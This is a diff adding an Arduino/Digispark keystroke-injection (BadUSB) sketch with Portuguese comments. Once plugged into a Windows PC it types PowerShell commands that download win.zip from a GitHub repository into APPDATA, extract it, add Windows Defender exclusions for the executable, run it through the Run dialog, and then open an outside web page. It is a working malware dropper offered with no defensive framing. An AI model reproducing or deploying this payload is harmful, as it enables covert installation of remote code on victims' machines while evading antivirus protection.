@@ -1,0 +1,78 @@
+#include "DigiKeyboardPtBr.h"
+
+void setup() {
+  // Execute a função pressWindowsKey uma vez
+  pressWindowsKey();
+}
+
+void pressWindowsKey() {
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);  // Pressiona a tecla Win
+  DigiKeyboard.delay(1000);                     // Aguarda 1 segundo
+  DigiKeyboard.print("powershell");             // Digita "powershell" sem nova linha
+  DigiKeyboard.delay(500);                      // Aguarda 1 segundo
+
+  // Substitua essas linhas pelos códigos específicos para as teclas direcionais
+  DigiKeyboardPtBr.sendKeyStroke(79, KEY_ARROW_LEFT);
+  DigiKeyboard.delay(800);  // Aguarda 1 segundo
+  DigiKeyboardPtBr.sendKeyStroke(81, KEY_ARROW_LEFT);
+  DigiKeyboard.delay(800);
+  DigiKeyboardPtBr.sendKeyStroke(40, KEY_ARROW_LEFT);
+  DigiKeyboard.delay(800);
+
+  // Navegar para o diretório APPDATA e baixar o arquivo diretamente lá
+  DigiKeyboardPtBr.print("cd $env:APPDATA");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println();
+
+  DigiKeyboardPtBr.print("Invoke-WebRequest -Uri 'https://github.com/tekrav/aas/raw/main/win.zip' -OutFile 'win.zip'");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println();
+
+  DigiKeyboardPtBr.print("Add-MpPreference -ExclusionPath \"$env:APPDATA\\wins\\win.exe\"");
+
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println();
+
+
+  // Extrair o conteúdo do arquivo win.zip
+  DigiKeyboardPtBr.print("Expand-Archive -Path \"$env:APPDATA\\win.zip\" -DestinationPath \"$env:APPDATA\\wins\"");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println();
+
+  // Adiciona o caminho à lista de exclusões do Windows Defender
+  DigiKeyboardPtBr.print("Add-MpPreference -ExclusionPath \"$env:APPDATA\\wins\\win.exe\"");
+
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println();
+
+
+
+
+  DigiKeyboardPtBr.print("Add-MpPreference -ExclusionPath \"$env:APPDATA\\wins\\win.exe\"");
+
+  DigiKeyboard.println();
+
+  DigiKeyboard.print("Exit");
+  DigiKeyboard.println();
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Pressiona Win + R
+  DigiKeyboard.delay(500);
+  DigiKeyboardPtBr.print("%APPDATA%/wins");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);  // Aguarda 1 segundo após a execução
+  DigiKeyboardPtBr.print("w");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Pressiona Win + R
+  DigiKeyboard.delay(500);
+  DigiKeyboardPtBr.print("https://klpt.free.nf/finish.html");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+
+void loop() {
+  // Não há código no loop, e ele não será executado
+}
